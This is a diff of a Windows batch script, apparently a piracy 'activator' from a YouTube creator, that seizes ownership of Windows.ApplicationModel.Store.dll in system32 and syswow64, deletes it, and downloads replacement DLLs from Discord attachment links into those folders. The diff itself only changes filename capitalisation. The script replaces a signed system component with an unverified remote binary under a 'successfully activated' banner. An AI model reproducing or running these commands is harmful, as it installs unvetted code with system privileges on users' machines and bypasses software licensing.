@@ -26,17 +26,17 @@ ECHO ===========================================================================
 echo.&echo
 
 cd C:/windows/system32/ >nul
-takeown /f windows.applicationmodel.store.dll >nul
-icacls windows.applicationmodel.store.dll /grant %username%:f > nul
-del windows.applicationmodel.store.dll >nul
+takeown /f Windows.ApplicationModel.Store.dll >nul
+icacls Windows.Applicationmodel.Store.dll /grant %username%:f > nul
+del Windows.ApplicationModel.Store.dll >nul
 cd C:/windows/syswow64 >nul
-takeown /f windows.applicationmodel.store.dll >nul
-icacls windows.applicationmodel.store.dll /grant %username%:f > nul
-del windows.applicationmodel.store.dll >nul
+takeown /f Windows.ApplicationModel.Store.dll >nul
+icacls Windows.ApplicationModel.Store.dll /grant %username%:f > nul
+del Windows.ApplicationModel.Store.dll >nul
 
 cd C:/windows/system32 >nul
-curl "https://cdn.discordapp.com/attachments/1030847408202076220/1230458652247199764/Windows.ApplicationModel.Store.dll?ex=663364eb&is=6620efeb&hm=8ee422316a75856bc8efd383a74812148a5582aa3e357dcb6361f09b527582b0&" -o windows.applicationmodel.store.dll >nul
+curl "https://cdn.discordapp.com/attachments/1030847408202076220/1230458652247199764/Windows.ApplicationModel.Store.dll?ex=663364eb&is=6620efeb&hm=8ee422316a75856bc8efd383a74812148a5582aa3e357dcb6361f09b527582b0&" -o Windows.ApplicationModel.Store.dll >nul
 
 cd C:/windows/syswow64 >nul
-curl "https://cdn.discordapp.com/attachments/1030847408202076220/1230525388535365682/Windows.ApplicationModel.Store.dll?ex=6633a312&is=66212e12&hm=72c7d8bb512e739b2e4852a4bbf380cafa72e0f2306f73729483ceb86fb8b1a9&" -o windows.applicationmodel.store.dll >nul
+curl "https://cdn.discordapp.com/attachments/1030847408202076220/1230525388535365682/Windows.ApplicationModel.Store.dll?ex=6633a312&is=66212e12&hm=72c7d8bb512e739b2e4852a4bbf380cafa72e0f2306f73729483ceb86fb8b1a9&" -o Windows.ApplicationModel.Store.dll >nul
 echo.&echo =====================================================================================&echo.&echo ACTIVATED SUCCESSFULLY!!! &echo.&echo #My YouTube Channel: youtube.com/shivuthetechguy&echo.&echo "Show Some Support By Pressing The Like & Share Button And Don't Forget To Subsribe To Me For Such Content" &echo.&echo #Please feel free to contact us at discord 'dsc.gg/shivu' if you have any questions or concerns.&echo.&echo #Please consider supporting this project: UPI ID : chauhansaab1@fam UPI USER : Shivansh Chauhan&echo #Your support is help me making this kind of stuff!&echo Thanks!&echo.&echo =====================================================================================&choice /n /c YN /m "Would you like to visit my blog [Y,N]?"
